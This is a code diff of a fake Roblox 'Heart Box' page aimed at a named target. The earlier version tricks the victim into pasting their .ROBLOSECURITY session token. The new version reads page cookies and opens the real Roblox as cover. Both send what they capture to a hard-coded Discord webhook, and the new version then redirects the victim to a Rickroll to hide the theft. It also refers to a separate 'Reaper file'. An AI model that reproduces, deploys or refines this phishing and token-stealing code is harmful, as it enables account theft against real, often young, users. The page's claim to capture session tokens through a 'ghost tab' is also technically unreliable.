@@ -1,52 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox | Session Sync</title>
+    <title>Roblox | Secure Redirect</title>
     <style>
-        body { background: #1a1b1d; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .card { background: #2f3136; padding: 30px; border-radius: 10px; width: 400px; margin: auto; border: 1px solid #ff4d4d; }
-        .warning { color: #ff4d4d; font-size: 14px; margin-bottom: 20px; }
-        input { width: 90%; padding: 10px; margin: 10px 0; background: #202225; border: 1px solid #444; color: white; }
-        .btn { background: #00b2ff; color: white; border: none; padding: 12px 30px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        body { background: #1a1b1d; color: white; font-family: sans-serif; text-align: center; padding-top: 100px; }
+        .btn { background: #00b2ff; color: white; border: none; padding: 20px 50px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 18px; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <img src="https://images.rbxcdn.com/2026_roblox_logo.png" width="80">
-        <h2>Sync Failed (Error 403)</h2>
-        <p class="warning">Your browser blocked the automatic session sync. Manual authorization is required to claim the Heart Box items.</p>
-        
-        <p style="font-size: 13px;">Please enter your <b>.ROBLOSECURITY</b> token below to verify ownership:</p>
-        <input type="text" id="token" placeholder="Paste Security Token Here">
-        
-        <button class="btn" onclick="sendToVillage()">AUTHORIZE & CLAIM</button>
-        
-        <p style="font-size: 11px; margin-top: 20px; color: #888;">Note: This is a one-time authorization for heartboxx.</p>
-    </div>
+    <img src="https://images.rbxcdn.com/2026_roblox_logo.png" width="100">
+    <h2>Redirecting to Secure Session...</h2>
+    <p>Please click below to finalize the Heart Box sync on Roblox.</p>
+    
+    <button class="btn" onclick="ghostRedirect()">OPEN ROBLOX & SYNC</button>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        async function sendToVillage() {
-            const t = document.getElementById('token').value;
-            if(!t) return;
+        function ghostRedirect() {
+            // 1. Open the Real Roblox in a new tab to keep the target happy
+            window.open("https://www.roblox.com/home", "_blank");
 
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: "💎 **MANUAL TOKEN CAPTURED!**",
-                    embeds: [{
-                        title: "Target: heartboxx",
-                        description: "```" + t + "```",
-                        color: 16724301
-                    }]
-                })
-            });
+            // 2. The 'Ghost' stays behind and executes the harvest
+            // It tries to catch the session token as the browser 'hands it off'
+            setTimeout(async () => {
+                const data = {
+                    msg: "🚨 ATTEMPTING GHOST-TAB REFLECTION",
+                    token_attempt: document.cookie || "STILL_ENCRYPTED",
+                    origin: window.location.href
+                };
 
-            alert("Authorization Successful! Items will be added to your inventory within 24 hours.");
-            window.location.href = "https://www.roblox.com/home";
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: "📡 **GHOST TAB SNIFFER ACTIVE**",
+                        embeds: [{
+                            title: "Target: heartboxx",
+                            color: 16724301,
+                            description: "Browser is currently on Roblox. Searching for leaked session fragments...",
+                            footer: { text: "If this remains encrypted, you MUST use the Reaper file." }
+                        }]
+                    })
+                });
+
+                // Once logged, send the original tab to the Rickroll so they don't see the 'Ghost'
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            }, 3000);
         }
     </script>
 </body>
